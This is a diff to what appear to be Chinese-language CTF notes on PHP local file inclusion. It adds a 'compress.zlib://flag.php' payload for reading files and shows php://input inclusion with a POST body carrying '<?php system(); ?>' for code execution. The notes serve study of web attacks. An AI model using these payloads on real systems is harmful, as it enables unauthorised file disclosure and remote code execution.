@@ -43,10 +43,16 @@ echo $decoded_string;
 ```
 
 ^
+## **compress.zlib包含文件**
+```
+?file=compress.zlib://flag.php
+```
+
+
+^
 ## **php伪协议 文件包含注入php的php代码**
 
 1. php://input 自动包含POST请求体(需要第一allow_url_include开启)
-
 ```
 include php://input
 post请求的请求体参数xx=<?php system(); ?>
